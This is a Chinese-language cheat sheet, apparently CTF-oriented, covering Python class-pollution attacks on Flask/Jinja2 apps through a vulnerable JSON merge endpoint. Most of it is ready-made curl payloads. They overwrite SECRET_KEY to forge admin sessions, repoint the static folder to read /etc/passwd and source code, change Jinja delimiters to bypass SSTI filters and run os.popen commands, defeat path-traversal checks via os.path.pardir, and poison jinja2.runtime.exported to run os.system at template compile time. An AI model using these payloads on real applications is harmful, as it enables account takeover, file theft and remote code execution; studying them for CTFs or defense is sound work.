# Flask/Jinja2 污染目标详解

---

## 1. SECRET_KEY — Session 伪造

**路径**: `__init__.__globals__.app.config.SECRET_KEY`

Flask 使用 SECRET_KEY 签名 session cookie。污染为已知值后可用 `flask-unsign` 伪造任意 session。

```bash
# 污染
curl -X POST http://target/api/merge \
  -H 'Content-Type: application/json' \
  -d '{"__init__": {"__globals__": {"app": {"config": {"SECRET_KEY": "hacked"}}}}}'

# 伪造 session
flask-unsign --sign --cookie '{"user":"admin","is_admin":true}' --secret 'hacked'
# 输出: eyJ...

# 使用伪造 session
curl -b 'session=eyJ...' http://target/admin
```

如果 Flask 使用 pickle 反序列化 session（部分应用的自定义 session），伪造后还可触发 pickle RCE。

---

## 2. _static_url_path — 静态目录篡改实现文件读取

**路径**: `__init__.__globals__.app._static_url_path`

Flask 的 `/static/` 路由对应 `_static_url_path` 目录下的文件。默认值是 `static`。

```bash
# 污染为当前目录
curl -X POST http://target/api/merge \
  -H 'Content-Type: application/json' \
  -d '{"__init__": {"__globals__": {"app": {"_static_url_path": "/"}}}}'

# 读取文件
curl http://target/static/flag
curl http://target/static/etc/passwd
curl http://target/static/app/app.py
```

---

## 3. Jinja2 定界符 — 绕过 SSTI 过滤

**路径**:
- `__init__.__globals__.app.jinja_env.variable_start_string`（默认 `{{`）
- `__init__.__globals__.app.jinja_env.variable_end_string`（默认 `}}`）

当目标有 SSTI 注入点但过滤了 `{{` `}}` 时，修改定界符即可绕过。

```bash
# 同时修改起始和结束定界符
curl -X POST http://target/api/merge \
  -H 'Content-Type: application/json' \
  -d '{"__init__": {"__globals__": {"app": {"jinja_env": {"variable_start_string": "[[", "variable_end_string": "]]"}}}}}'

# 用新定界符注入（不被 {{ 过滤拦截）
curl "http://target/page?name=[[config]]"
curl "http://target/page?name=[[request.application.__globals__.__builtins__.__import__('os').popen('id').read()]]"
```

> ⚠️ **缓存陷阱**: 如果目标模板页面已被访问过，Jinja2 会使用缓存的编译结果。必须在首次访问模板之前完成污染。

**额外**: 还可修改 `block_start_string`（默认 `{%`）和 `block_end_string`（默认 `%}`）来绕过 `{%` 的过滤：

```bash
curl -X POST http://target/api/merge \
  -H 'Content-Type: application/json' \
  -d '{"__init__": {"__globals__": {"app": {"jinja_env": {"block_start_string": "<%", "block_end_string": "%>"}}}}}'
```

---

## 4. jinja_loader.searchpath — 模板加载目录篡改

**路径**: `__init__.__globals__.app.jinja_loader.searchpath`

Flask 默认从 `./templates` 目录加载模板文件。修改 searchpath 后，`render_template('flag')` 会从新路径加载。

```bash
# 修改模板搜索路径为根目录
curl -X POST http://target/api/merge \
  -H 'Content-Type: application/json' \
  -d '{"__init__": {"__globals__": {"app": {"jinja_loader": {"searchpath": ["/"]}}}}}'

# 如果代码调用 render_template('flag') 或 render_template(user_input)
# 则会渲染 /flag 文件内容
```

---

## 5. os.path.pardir — 绕过模板路径穿越检查

**路径**: `__init__.__globals__.os.path.pardir`

`os.path.pardir` 默认值为 `..`。Jinja2 的 `split_template_path()` 函数检查路径分段中是否包含 `os.path.pardir` 来防止目录穿越。修改这个值即可绕过。

```bash
# 将 pardir 从 ".." 改为 "!"
curl -X POST http://target/api/merge \
  -H 'Content-Type: application/json' \
  -d '{"__init__": {"__globals__": {"os": {"path": {"pardir": "!"}}}}}'

# 现在 render_template("../../flag") 不会被拦截
curl http://target/../../flag
```

---

## 6. _got_first_request — 重新触发 before_first_request

**路径**: `__init__.__globals__.app._got_first_request`

`@app.before_first_request` 装饰的函数只在首次请求时执行。将 `_got_first_request` 重置为 False 可强制再次执行。

```bash
curl -X POST http://target/api/merge \
  -H 'Content-Type: application/json' \
  -d '{"__init__": {"__globals__": {"app": {"_got_first_request": false}}}}'
# 下次请求会重新触发 before_first_request 中的初始化逻辑
```

适用场景：初始化函数中有条件性读取 flag 的逻辑，但条件依赖于之后才设置的属性值。

---

## 7. jinja_env.globals — Jinja2 全局变量注入

**路径**: `__init__.__globals__.app.jinja_env.globals`

Jinja2 的 `globals` 字典中的变量可在所有模板中直接使用。注入变量可绕过模板中的条件检查。

```bash
# 注入 permission=True 绕过 {% if permission %} 检查
curl -X POST http://target/api/merge \
  -H 'Content-Type: application/json' \
  -d '{"__init__": {"__globals__": {"app": {"jinja_env": {"globals": {"permission": true}}}}}}'
```

> 注意: 通过 JSON 无法直接注入 Python 函数对象（如 os.popen），只能注入基本类型值。

---

## 8. Jinja2 编译层 RCE — jinja2.runtime.exported

**路径**: 需通过 `__spec__.__init__.__globals__` 链到达 `jinja2.runtime` 模块

这是最高级的利用方式。Jinja2 编译模板时，`compiler.py` 中的 `visit_Template` 方法会将 `jinja2.runtime.exported` 列表中的名称作为模板编译的 import 语句。污染这个列表可以在模板编译时注入任意代码。

```bash
# payload 需要注入到 jinja2.runtime 模块的 exported 变量
# 通过 __spec__.__init__.__globals__['sys'].modules['jinja2.runtime'] 路径访问
# 具体 payload 格式: exported 中插入恶意 Python 表达式

# 示例（具体值取决于目标 Jinja2 版本）:
curl -X POST http://target/api/merge \
  -H 'Content-Type: application/json' \
  -d '{
    "__init__": {
      "__globals__": {
        "__spec__": {
          "__init__": {
            "__globals__": {
              "sys": {
                "modules": {
                  "jinja2.runtime": {
                    "exported": ["*;import os;os.system(\"cp /flag /app/static/f\")#"]
                  }
                }
              }
            }
          }
        }
      }
    }
  }'
# 然后访问任何触发 render_template 的页面
# 最后读取: curl http://target/static/f
```

> ⚠️ 同样受模板缓存影响，必须在目标模板首次渲染之前完成污染。

---

## 参考链接

- [Python 原型链污染变体 - 跳跳糖](https://tttang.com/archive/1876/)
- [Prototype Pollution in Python - abdulrah33m](https://blog.abdulrah33m.com/prototype-pollution-in-python/)
- [idekCTF 2022 Task Manager Writeup](https://y4tacker.github.io/2023/01/16/year/2023/2023IdekCTFWriteup/#Task-Manager)
- [CVE-2023-26145 - pydash Command Injection](https://nvd.nist.gov/vuln/detail/CVE-2023-26145)
